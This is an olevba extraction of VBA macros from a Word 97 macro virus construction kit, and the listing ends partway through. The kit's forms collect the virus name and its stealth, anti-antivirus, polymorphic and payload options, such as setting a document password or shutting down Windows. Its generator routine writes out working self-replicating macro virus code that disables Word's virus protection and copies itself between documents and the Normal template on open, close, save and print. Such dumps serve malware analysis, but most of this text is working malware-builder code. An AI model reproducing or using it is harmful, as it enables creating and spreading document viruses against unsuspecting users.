olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Constructor.MSWord.DW97Mvck
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DW97MVCK.bas 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/DW97MVCK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public VirusName As String
Public SourceFileName As String
Public NumberOfMacros As String

Sub AutoOpen()
On Error Resume Next

  Application.Caption = "DarkChasm's Word 97 Macro Virus Construction Kit"
  frmStartForm.Show

End Sub

Sub FileTemplates()

End Sub

Sub ToolsCustomize()

End Sub

Sub FileNew()

End Sub

Sub EditCut()

End Sub

Sub EditCopy()

End Sub

Sub EditPaste()

End Sub

Sub EditPasteSpecial()

End Sub

Sub EditClear()

End Sub

Sub EditSelectAll()

End Sub

Sub EditFind()

End Sub

Sub EditReplace()

End Sub

Sub EditGoTo()

End Sub

Sub ToolsOptions()

End Sub

Sub InsertObject()

End Sub

Sub InsertFile()

End Sub

Sub InsertHyperlink()

End Sub

Sub InsertCaption()

End Sub

Sub InsertFootNote()

End Sub

Sub InsertBreak()

End Sub

Sub TableSort()

End Sub

Sub TableFormula()

End Sub

Sub FilePrint()

End Sub

Sub FilePrintPreview()

End Sub

Sub FileVersions()

End Sub

Sub FileProperties()

End Sub

Sub ToolsWordCount()

End Sub

Sub ToolsMacro()

End Sub

Sub ViewVBCode()

End Sub
-------------------------------------------------------------------------------
VBA MACRO frmStartForm.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmStartForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cmdOK_Click()
  frmStartForm.Hide
  frmVirusSourceName.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmVirusSourceName.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmVirusSourceName'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cmdOK_Click()
On Error GoTo DW97MVCK
  
  If txtVirusName.Text = "" Then
    MsgBox "Fill out the Virus Name text box.", vbOKOnly, "DW97MVCK"
    txtboxnotfilled = 1
  End If
  
  If txtSourceFileName.Text = "" Then
    MsgBox "Fill out the Source File Name text box.", vbOKOnly, "DW97MVCK"
    txtboxnotfilled = 1
  End If
  
  If opttxt.Value = False And optBAS.Value = False Then
    MsgBox "Choose if you want the output file to be a txt file or bas file.", vbOKOnly, "DW97MVCK"
    txtboxnotfilled = 1
  End If
  
  If txtboxnotfilled = 1 Then GoTo DW97MVCK
  
  If opttxt.Value = True Then
    txtSourceFileName = txtSourceFileName & ".txt"
  End If
  
  If optBAS.Value = True Then
    txtSourceFileName = txtSourceFileName & ".bas"
  End If
  
  VirusName = txtVirusName.Text
  SourceFileName = txtSourceFileName.Text

  frmVirusSourceName.Hide
  frmVirusBody.Show

DW97MVCK:
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmVirusBody.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmVirusBody'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
On Error GoTo ByeBye
  If chkbStealth.Value = True Then
    frmStealth.Show
  End If
  If chkbRetro.Value = True Then
    frmRetro.Show
  End If
  If chkbPolymorphic.Value = True Then
    frmPolymorphic.Show
  End If
  If chkbPayload.Value = True Then
    frmPayload.Show
  End If

  frmVirusBody.Hide
  frmMacros.Show

ByeBye:
End Sub

Private Sub UserForm_Initialize()
On Error GoTo ByeBye
lblVirusName = VirusName
lblSourceFileName = SourceFileName
ByeBye:
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmStealth.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmStealth'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cmdOK_Click()

  frmStealth.Hide

End Sub
-------------------------------------------------------------------------------
VBA MACRO frmRetro.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmRetro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cmdOK_Click()

frmRetro.Hide

End Sub
-------------------------------------------------------------------------------
VBA MACRO frmPolymorphic.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmPolymorphic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cmdOK_Click()

  frmPolymorphic.Hide

End Sub
-------------------------------------------------------------------------------
VBA MACRO frmPayload.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmPayload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cmdOK_Click()
On Error GoTo ByeBye

If chkbMessageBox.Value = True Then
  frmPayloadMessageBox.Show
End If

If chkbPassword.Value = True Then
  frmPayloadSetPassword.Show
End If

If chkbBeep.Value = True Then
  frmPayloadBeep.Show
End If

If chkbExitWindows.Value = True Then
  frmPayloadExitWindows.Show
End If

If chkbAssistant.Value = True Then
  frmPayloadOfficeAssistant.Show
End If

If chkbCaption.Value = True Then
  frmPayloadChangeCaption.Show
End If

If chkbChangeStatusBar.Value = True Then
  frmPayloadChangeStatusBar.Show
End If

frmPayload.Hide

ByeBye:
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmPayloadMessageBox.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmPayloadMessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cmdOK_Click()
  If txtMessageBoxTitle = "" Then GoTo ByeBye
  If txtMessageBox = "" Then GoTo ByeBye
  frmPayloadMessageBox.Hide
ByeBye:
End Sub

-------------------------------------------------------------------------------
VBA MACRO frmPayloadSetPassword.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmPayloadSetPassword'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cmdOK_Click()
  If txtPassword = "" Then GoTo ByeBye
  frmPayloadSetPassword.Hide
ByeBye:
End Sub

-------------------------------------------------------------------------------
VBA MACRO frmPayloadBeep.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmPayloadBeep'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cmdOK_Click()
On Error Resume Next
  If txtYear = "" Then
    txtYear = "Now()"
  End If
  If txtYear < 1997 Then
    txtYear = "1997"
  End If
  If txtYear > 3000 Then
    txtYear = "3000"
  End If

  If txtDay = "" Then
    txtDay = "Now()"
  End If
  If txtDay > 31 Then GoTo DW97MVCK
  If txtDay < 1 Then GoTo DW97MVCK
  
  If txtMonth = "" Then
    txtMonth = "Now()"
  End If
  If txtMonth > 12 Then GoTo DW97MVCK
  If txtMonth < 1 Then GoTo DW97MVCK
  
  frmPayloadBeep.Hide
DW97MVCK:
End Sub

Private Sub SpinButton1_SpinDown()
  If txtNumberOfBeeps = 1 Then GoTo DW97MVCK
  txtNumberOfBeeps = txtNumberOfBeeps - 1
DW97MVCK:
End Sub

Private Sub SpinButton1_SpinUp()
  txtNumberOfBeeps = txtNumberOfBeeps + 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmPayloadExitWindows.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmPayloadExitWindows'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cmdOK_Click()
  frmPayloadExitWindows.Hide
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmPayloadOfficeAssistant.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmPayloadOfficeAssistant'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cmdOK_Click()
  If txtHeading = "" Then GoTo ByeBye
  If txtMessage = "" Then GoTo ByeBye
  frmPayloadOfficeAssistant.Hide
ByeBye:
End Sub

-------------------------------------------------------------------------------
VBA MACRO frmPayloadChangeStatusBar.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmPayloadChangeStatusBar'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cmdOK_Click()
  If txtStatusBar = "" Then GoTo ByeBye
  frmPayloadChangeStatusBar.Hide
ByeBye:
End Sub

-------------------------------------------------------------------------------
VBA MACRO frmPayloadChangeCaption.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmPayloadChangeCaption'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cmdOK_Click()
  If txtCaption = "" Then GoTo ByeBye
  frmPayloadChangeCaption.Hide
ByeBye:
End Sub

-------------------------------------------------------------------------------
VBA MACRO frmMacros.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub cmdOK_Click()
On Error GoTo ByeBye
  NumberOfMacros = 0
  
  If chkbAutoOpen.Value = True Then
    NumberOfMacros = NumberOfMacros + 1
  End If

  If chkbAutoClose.Value = True Then
    NumberOfMacros = NumberOfMacros + 1
  End If

  If chkbFileSaveAs.Value = True Then
    NumberOfMacros = NumberOfMacros + 1
  End If

  If chkbFileSave.Value = True Then
    NumberOfMacros = NumberOfMacros + 1
  End If

  If chkbFilePrint.Value = True Then
    NumberOfMacros = NumberOfMacros + 1
  End If

  If chkbToolsWordCount.Value = True Then
    NumberOfMacros = NumberOfMacros + 1
  End If

  If chkbEditFind.Value = True Then
    NumberOfMacros = NumberOfMacros + 1
  End If

  If chkbAutoOpen.Value = False And chkbAutoClose.Value = False And chkbFileSaveAs.Value = False And chkbFileSave.Value = False And chkbFilePrint.Value = False And chkbEditFind.Value = False And chkbToolsWordCount.Value = False Then
    GoTo DW97MVCK
  End If
  
  frmMacros.Hide
  frmMakeVirus.Show

GoTo ByeBye
DW97MVCK:
  MsgBox "Pick a macro to use as the infection vector.", vbOKOnly, "DW97MVCK"
ByeBye:
End Sub
-------------------------------------------------------------------------------
VBA MACRO frmMakeVirus.frm 
in file: Constructor.MSWord.DW97Mvck - OLE stream: 'Macros/VBA/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub cmdExit_Click()
On Error Resume Next
  Tasks.ExitWindows
End Sub

Private Sub cmdMAKE_Click()
On Error GoTo ByeBye

Open SourceFileName For Output As #1
Print #1,
Print #1, "'Generated by DarkChasm's Word 97 Macro Virus Construction Kit (DW97MVCK)"
Print #1, "'Virus Name: " & VirusName
Print #1,

If frmMacros.chkbAutoOpen = True Then
  Print #1,
  Print #1, "'------------------------------------------------------------"
  Print #1, "'AutoOpen macro"
  Print #1, "'Executed when a document is opened"
  Print #1, "'------------------------------------------------------------"
  Print #1, "Sub AutoOpen()"
  Print #1, "  On Error GoTo " & VirusName
  Print #1,
  
  If frmPayload.chkbAssistant = True Or frmPayload.chkbBeep = True Or frmPayload.chkbCaption = True Or frmPayload.chkbChangeStatusBar = True Or frmPayload.chkbExitWindows = True Or frmPayload.chkbMessageBox = True Or frmPayload.chkbPassword = True Then
    Print #1, "  Payload"
    Print #1,
  End If
  
  If frmPolymorphic.optAPMRS = True Then
    Print #1, "  Mutate"
    Print #1,
  End If
  
  Print #1, "  Application.ScreenUpdating = False"
  Print #1, "  Application.DisplayAlerts = wdAlertsNone"
  Print #1,
  Print #1, "  WordBasic.DisableAutoMacros 0"
  Print #1, "  Options.VirusProtection = False"
  Print #1,
  Print #1, "  Set GlobalDoc = NormalTemplate"
  Print #1, "  Set ActiveDoc = ActiveDocument"
  Print #1,
  Print #1, "  GlobalInstalled = No"
  Print #1, "  DocumentInstalled = No"
  Print #1,
  Print #1, "  For j = 1 To NormalTemplate.VBProject.VBComponents.Count"
  Print #1, "    If NormalTemplate.VBProject.VBComponents(j).Name = """ & VirusName & """ Then"
  Print #1, "      GlobalInstalled = Yes"
  Print #1, "    End If"
  Print #1, "  Next"
  Print #1,
  Print #1, "  For i = 1 To ActiveDocument.VBProject.VBComponents.Count"
  Print #1, "    If ActiveDocument.VBProject.VBComponents(i).Name = """ & VirusName & """ Then"
  Print #1, "      DocumentInstalled = Yes"
  Print #1, "    End If"
  Print #1, "  Next"
  Print #1,
  Print #1, "  If GlobalInstalled = No Then"
  Print #1, "    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=""" & VirusName & """, Object:=wdOrganizerObjectProjectItems"
  Print #1, "    Options.SaveNormalPrompt = False"
  Print #1, "  End If"
  Print #1,
  Print #1, "  If DocumentInstalled = No Then"
  Print #1, "    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=""" & VirusName & """, Object:=wdOrganizerObjectProjectItems"
  Print #1, "      ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate"
  Print #1, "  End If"
  Print #1,
  Print #1, "  Application.DisplayAlerts = wdAlertsAll"
  Print #1,
  
  If frmRetro.chkbAVP Or frmRetro.chkbFMacro Or frmRetro.chkbFProt95 Or frmRetro.chkbMcAfee Or frmRetro.chkbNorton Or frmRetro.chkbPCCillan95 Or frmRetro.chkbPCCillan97 Or frmRetro.chkbTBAV = True Then
    Print #1, "  Retro"
    Print #1,
  End If
  
  Print #1, VirusName & ":"
  Print #1, "End Sub"
  Print #1,
    
  End If


  If frmMacros.chkbAutoClose = True Then
  Print #1,
  Print #1, "'------------------------------------------------------------"
  Print #1, "'AutoClose macro"
  Print #1, "'Executed when a document is closed"
  Print #1, "'------------------------------------------------------------"
  Print #1, "Sub AutoClose()"
  Print #1, "  On Error GoTo " & VirusName
  Print #1,
  
  If frmPayload.chkbAssistant = True Or frmPayload.chkbBeep = True Or frmPayload.chkbCaption = True Or frmPayload.chkbChangeStatusBar = True Or frmPayload.chkbExitWindows = True Or frmPayload.chkbMessageBox = True Or frmPayload.chkbPassword = True Then
    Print #1, "  Payload"
    Print #1,
  End If
  
  If frmPolymorphic.optAPMRS = True Then
    Print #1, "  Mutate"
    Print #1,
  End If
  
  Print #1, "  Application.ScreenUpdating = False"
  Print #1, "  Application.DisplayAlerts = wdAlertsNone"
  Print #1,
  Print #1, "  WordBasic.DisableAutoMacros 0"
  Print #1, "  Options.VirusProtection = False"
  Print #1,
  Print #1, "  Set GlobalDoc = NormalTemplate"
  Print #1, "  Set ActiveDoc = ActiveDocument"
  Print #1,
  Print #1, "  GlobalInstalled = No"
  Print #1, "  DocumentInstalled = No"
  Print #1,
  Print #1, "  For j = 1 To NormalTemplate.VBProject.VBComponents.Count"
  Print #1, "    If NormalTemplate.VBProject.VBComponents(j).Name = """ & VirusName & """ Then"
  Print #1, "      GlobalInstalled = Yes"
  Print #1, "    End If"
  Print #1, "  Next"
  Print #1,
  Print #1, "  For i = 1 To ActiveDocument.VBProject.VBComponents.Count"
  Print #1, "    If ActiveDocument.VBProject.VBComponents(i).Name = """ & VirusName & """ Then"
  Print #1, "      DocumentInstalled = Yes"
  Print #1, "    End If"
  Print #1, "  Next"
  Print #1,
  Print #1, "  If GlobalInstalled = No Then"
  Print #1, "    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=""" & VirusName & """, Object:=wdOrganizerObjectProjectItems"
  Print #1, "    Options.SaveNormalPrompt = False"
  Print #1, "  End If"
  Print #1,
  Print #1, "  If DocumentInstalled = No Then"
  Print #1, "    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=""" & VirusName & """, Object:=wdOrganizerObjectProjectItems"
  Print #1, "      ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate"
  Print #1, "  End If"
  Print #1,
  Print #1, "  Application.DisplayAlerts = wdAlertsAll"
  Print #1,
  
  If frmRetro.chkbAVP Or frmRetro.chkbFMacro Or frmRetro.chkbFProt95 Or frmRetro.chkbMcAfee Or frmRetro.chkbNorton Or frmRetro.chkbPCCillan95 Or frmRetro.chkbPCCillan97 Or frmRetro.chkbTBAV = True Then
    Print #1, "  Retro"
    Print #1,
  End If
  
  Print #1, VirusName & ":"
  Print #1, "End Sub"
  Print #1,
    
  End If

  If frmMacros.chkbFileSaveAs = True Then
  Print #1,
  Print #1, "'------------------------------------------------------------"
  Print #1, "'FileSaveAs macro"
  Print #1, "'Executed when a user selects File SaveAs from the Word menu"
  Print #1, "'------------------------------------------------------------"
  Print #1, "Sub FileSaveAs()"
  Print #1,
  Print #1, "  Dialogs(wdDialogFileSaveAs).Show"
  Print #1,
  Print #1, "  On Error GoTo " & VirusName
  Print #1,
  
  If frmPayload.chkbAssistant = True Or frmPayload.chkbBeep = True Or frmPayload.chkbCaption = True Or frmPayload.chkbChangeStatusBar = True Or frmPayload.chkbExitWindows = True Or frmPayload.chkbMessageBox = True Or frmPayload.chkbPassword = True Then
    Print #1, "  Payload"
    Print #1,
  End If
  
  If frmPolymorphic.optAPMRS = True Then
    Print #1, "  Mutate"
    Print #1,
  End If
  
  Print #1, "  Application.ScreenUpdating = False"
  Print #1, "  Application.DisplayAlerts = wdAlertsNone"
  Print #1,
  Print #1, "  WordBasic.DisableAutoMacros 0"
  Print #1, "  Options.VirusProtection = False"
  Print #1,
  Print #1, "  Set GlobalDoc = NormalTemplate"
  Print #1, "  Set ActiveDoc = ActiveDocument"
  Print #1,
  Print #1, "  GlobalInstalled = No"
  Print #1, "  DocumentInstalled = No"
  Print #1,
  Print #1, "  For j = 1 To NormalTemplate.VBProject.VBComponents.Count"
  Print #1, "    If NormalTemplate.VBProject.VBComponents(j).Name = """ & VirusName & """ Then"
  Print #1, "      GlobalInstalled = Yes"
  Print #1, "    End If"
  Print #1, "  Next"
  Print #1,
  Print #1, "  For i = 1 To ActiveDocument.VBProject.VBComponents.Count"
  Print #1, "    If ActiveDocument.VBProject.VBComponents(i).Name = """ & VirusName & """ Then"
  Print #1, "      DocumentInstalled = Yes"
  Print #1, "    End If"
  Print #1, "  Next"
  Print #1,
  Print #1, "  If GlobalInstalled = No Then"
  Print #1, "    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=""" & VirusName & """, Object:=wdOrganizerObjectProjectItems"
  Print #1, "    Options.SaveNormalPrompt = False"
  Print #1, "  End If"
  Print #1,
  Print #1, "  If DocumentInstalled = No Then"
  Print #1, "    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=""" & VirusName & """, Object:=wdOrganizerObjectProjectItems"
  Print #1, "      ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate"
  Print #1, "  End If"
  Print #1,
  Print #1, "  Application.DisplayAlerts = wdAlertsAll"
  Print #1,
  
  If frmRetro.chkbAVP Or frmRetro.chkbFMacro Or frmRetro.chkbFProt95 Or frmRetro.chkbMcAfee Or frmRetro.chkbNorton Or frmRetro.chkbPCCillan95 Or frmRetro.chkbPCCillan97 Or frmRetro.chkbTBAV = True Then
    Print #1, "  Retro"
    Print #1,
  End If
  
  Print #1, VirusName & ":"
  Print #1, "End Sub"
  Print #1,
    
  End If

  If frmMacros.chkbFileSave = True Then
  Print #1,
  Print #1, "'------------------------------------------------------------"
  Print #1, "'FileSave macro"
  Print #1, "'Executed when a user selects File Save from the Word menu"
  Print #1, "'------------------------------------------------------------"
  Print #1, "Sub FileSave()"
  Print #1,
  Print #1, "  ActiveDocument.Save"
  Print #1,
  Print #1, "  On Error GoTo " & VirusName
  Print #1,
  
  If frmPayload.chkbAssistant = True Or frmPayload.chkbBeep = True Or frmPayload.chkbCaption = True Or frmPayload.chkbChangeStatusBar = True Or frmPayload.chkbExitWindows = True Or frmPayload.chkbMessageBox = True Or frmPayload.chkbPassword = True Then
    Print #1, "  Payload"
    Print #1,
  End If
  
  If frmPolymorphic.optAPMRS = True Then
    Print #1, "  Mutate"
    Print #1,
  End If
  
  Print #1, "  Application.ScreenUpdating = False"
  Print #1, "  Application.DisplayAlerts = wdAlertsNone"
  Print #1,
  Print #1, "  WordBasic.DisableAutoMacros 0"
  Print #1, "  Options.VirusProtection = False"
  Print #1,
  Print #1, "  Set GlobalDoc = NormalTemplate"
  Print #1, "  Set ActiveDoc = ActiveDocument"
  Print #1,
  Print #1, "  GlobalInstalled = No"
  Print #1, "  DocumentInstalled = No"
  Print #1,
  Print #1, "  For j = 1 To NormalTemplate.VBProject.VBComponents.Count"
  Print #1, "    If NormalTemplate.VBProject.VBComponents(j).Name = """ & VirusName & """ Then"
  Print #1, "      GlobalInstalled = Yes"
  Print #1, "    End If"
  Print #1, "  Next"
  Print #1,
  Print #1, "  For i = 1 To ActiveDocument.VBProject.VBComponents.Count"
  Print #1, "    If ActiveDocument.VBProject.VBComponents(i).Name = """ & VirusName & """ Then"
  Print #1, "      DocumentInstalled = Yes"
  Print #1, "    End If"
  Print #1, "  Next"
  Print #1,
  Print #1, "  If GlobalInstalled = No Then"
  Print #1, "    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=""" & VirusName & """, Object:=wdOrganizerObjectProjectItems"
  Print #1, "    Options.SaveNormalPrompt = False"
  Print #1, "  End If"
  Print #1,
  Print #1, "  If DocumentInstalled = No Then"
  Print #1, "    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=""" & VirusName & """, Object:=wdOrganizerObjectProjectItems"
  Print #1, "      ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate"
  Print #1, "  End If"
  Print #1,
  Print #1, "  Application.DisplayAlerts = wdAlertsAll"
  Print #1,
  
  If frmRetro.chkbAVP Or frmRetro.chkbFMacro Or frmRetro.chkbFProt95 Or frmRetro.chkbMcAfee Or frmRetro.chkbNorton Or frmRetro.chkbPCCillan95 Or frmRetro.chkbPCCillan97 Or frmRetro.chkbTBAV = True Then
    Print #1, "  Retro"
    Print #1,
  End If
  
  Print #1, VirusName & ":"
  Print #1, "End Sub"
  Print #1,
    
  End If


  If frmMacros.chkbFilePrint = True Then
  Print #1,
  Print #1, "'------------------------------------------------------------"
  Print #1, "'FilePrint macro"
  Print #1, "'Executed when a user selects File Print from the Word menu"
  Print #1, "'------------------------------------------------------------"
  Print #1, "Sub FilePrint()"
  Print #1,
  Print #1, "  Dialogs(wdDialogFilePrint).Show"
  Print #1,
  Print #1, "  On Error GoTo " & VirusName
  Print #1,
  
  If frmPayload.chkbAssistant = True Or frmPayload.chkbBeep = True Or frmPayload.chkbCaption = True Or frmPayload.chkbChangeStatusBar = True Or frmPayload.chkbExitWindows = True Or frmPayload.chkbMessageBox = True Or frmPayload.chkbPassword = True Then
    Print #1, "  Payload"
    Print #1,
  End If
  
  If frmPolymorphic.optAPMRS = True Then
    Print #1, "  Mutate"
    Print #1,
  End If
  
  Print #1, "  Application.ScreenUpdating = False"
  Print #1, "  Application.DisplayAlerts = wdAlertsNone"
  Print #1,
  Print #1, "  WordBasic.DisableAutoMacros 0"
  Print #1, "  Options.VirusProtection = False"
  Print #1,
  Print #1, "  Set GlobalDoc = NormalTemplate"
  Print #1, "  Set ActiveDoc = ActiveDocument"
  Print #1,
  Print #1, "  GlobalInstalled = No"
  Print #1, "  DocumentInstalled = No"
  Print #1,
  Print #1, "  For j = 1 To NormalTemplate.VBProject.VBComponents.Count"
  Print #1, "    If NormalTemplate.VBProject.VBComponents(j).Name = """ & VirusName & """ Then"
  Print #1, "      GlobalInstalled = Yes"
  Print #1, "    End If"
  Print #1, "  Next"
  Print #1,
  Print #1, "  For i = 1 To ActiveDocument.VBProject.VBComponents.Count"
  Print #1, "    If ActiveDocument.VBProject.VBComponents(i).Name = """ & VirusName & """ Then"
  Print #1, "      DocumentInstalled = Yes"
  Print #1, "    End If"
  Print #1, "  Next"
  Print #1,
  Print #1, "  If GlobalInstalled = No Then"
  Print #1, "    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=""" & VirusName & """, Object:=wdOrganizerObjectProjectItems"
  Print #1, "    Options.SaveNormalPrompt = False"
  Print #1, "  End If"
  Print #1,
  Print #1, "  If DocumentInstalled = No Then"
  Print #1, "    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=""" & VirusName & """, Object:=wdOrganizerObjectProjectItems"
  Print #1, "  End If"
  Print #1,
  Print #1, "  Application.DisplayAlerts = wdAlertsAll"
  Print #1,
  
  If frmRetro.chkbAVP Or frmRetro.chkbFMacro Or frmRetro.chkbFProt95 Or frmRetro.chkbMcAfee Or frmRetro.chkbNorton Or frmRetro.chkbPCCillan95 Or frmRetro.chkbPCCillan97 Or frmRetro.chkbTBAV = True Then
    Print #1, "  Retro"
    Print #1,
  End If
  
  Print #1, VirusName & ":"
  Print #1, "End Sub"
  Print #1,
    
  End If

  If frmMacros.chkbEditFind = True Then
  Print #1,
  Print #1, "'------------------------------------------------------------"
  Print #1, "'EditFind macro"
  Print #1, "'Executed when a user selects Edit Find from the Word menu"
  Print #1, "'------------------------------------------------------------"
  Print #1, "Sub EditFind()"
  Print #1,
  Print #1, "  Dialogs(wdDialogEditFind).Show"
  Print #1,
  Print #1, "  On Error GoTo " & VirusName
  Print #1,
  
  If frmPayload.chkbAssistant = True Or frmPayload.chkbBeep = True Or frmPayload.chkbCaption = True Or frmPayload.chkbChangeStatusBar = True Or frmPayload.chkbExitWindows = True Or frmPayload.chkbMessageBox = True Or frmPayload.chkbPassword = True Then
    Print #1, "  Payload"
    Print #1,
  End If
  
  If frmPolymorphic.optAPMRS = True Then
    Print #1, "  Mutate"
    Print #1,
  End If
  
  Print #1, "  Application.ScreenUpdating = False"
  Print #1, "  Application.DisplayAlerts = wdAlertsNone"
  Print #1,
  Print #1, "  WordBasic.DisableAutoMacros 0"
  Print #1, "  Options.VirusProtection = False"
  Print #1,
  Print #1, "  Set GlobalDoc = NormalTemplate"
  Print #1, "  Set ActiveDoc = ActiveDocument"
  Print #1,
  Print #1, "  GlobalInstalled = No"
  Print #1, "  DocumentInstalled = No"
  Print #1,
  Print #1, "  For j = 1 To NormalTemplate.VBProject.VBComponents.Count"
  Print #1, "    If NormalTemplate.VBProject.VBComponents(j).Name = """ & VirusName & """ Then"
  Print #1, "      GlobalInstalled = Yes"
  Print #1, "    End If"
  Print #1, "  Next"
  Print #1,
  Print #1, "  For i = 1 To ActiveDocument.VBProject.VBComponents.Count"
  Print #1, "    If ActiveDocument.VBProject.VBComponents(i).Name = """ & VirusName & """ Then"
  Print #1, "      DocumentInstalled = Yes"
  Print #1, "    End If"
  Print #1, "  Next"
  Print #1,
  Print #1, "  If GlobalInstalled = No Then"
  Print #1, "    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=""" & VirusName & """, Object:=wdOrganizerObjectProjectItems"
  Print #1, "    Options.SaveNormalPrompt = False"
  Print #1, "  End If"
  Print #1,
  Print #1, "  If DocumentInstalled = No Then"
  Print #1, "    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=""" & VirusName & """, Object:=wdOrganizerObjectProjectItems"
  Print #1, "  End If"
  Print #1,
  Print #1, "  Application.DisplayAlerts = wdAlertsAll"
  Print #1,
  
  If frmRetro.chkbAVP Or frmRetro.chkbFMacro Or frmRetro.chkbFProt95 Or frmRetro.chkbMcAfee Or frmRetro.chkbNorton Or frmRetro.chkbPCCillan95 Or frmRetro.chkbPCCillan97 Or frmRetro.chkbTBAV = True Then
    Print #1, "  Retro"
    Print #1,
  End If
  
  Print #1, VirusName & ":"
  Print #1, "End Sub"
  Print #1,
    
  End If

  If frmMacros.chkbToolsWordCount = True Then
  Print #1,
  Print #1, "'------------------------------------------------------------"
  Print #1, "'ToolsWordCount macro"
  Print #1, "'Executed when a user selects Tools WordCount"
  Print #1, "'------------------------------------------------------------"
  Print #1, "Sub ToolsWordCount()"
  Print #1,
  Print #1, "  Dialogs(wdDialogToolsWordCount).Show"
  Print #1,
  Print #1, "  On Error GoTo " & VirusName
  Print #1,
  
  If frmPayload.chkbAssistant = True Or frmPayload.chkbBeep = True Or frmPayload.chkbCaption = True Or frmPayload.chkbChangeStatusBar = True Or frmPayload.chkbExitWindows = True Or frmPayload.chkbMessageBox = True Or frmPayload.chkbPassword = True Then
    Print #1, "  Payload"
    Print #1,
  End If
  
  If frmPolymorphic.optAPMRS = True Then
    Print #1, "  Mutate"
    Print #1,
  End If
  
  Print #1, "  Application.ScreenUpdating = False"
  Print #1, "  Application.DisplayAlerts = wdAlertsNone"
  Print #1,
  Print #1, "  WordBasic.DisableAutoMacros 0"
  Print #1, "  Options.VirusProtection = False"
  Print #1,
  Print #1, "  Set GlobalDoc = NormalTemplate"
  Print #1, "  Set ActiveDoc = ActiveDocument"
  Print #1,
  Print #1, "  GlobalInstalled = No"
  Print #1, "  DocumentInstalled = No"
  Print #1,
  Print #1, "  For j = 1 To NormalTemplate.VBProject.VBComponents.Count"
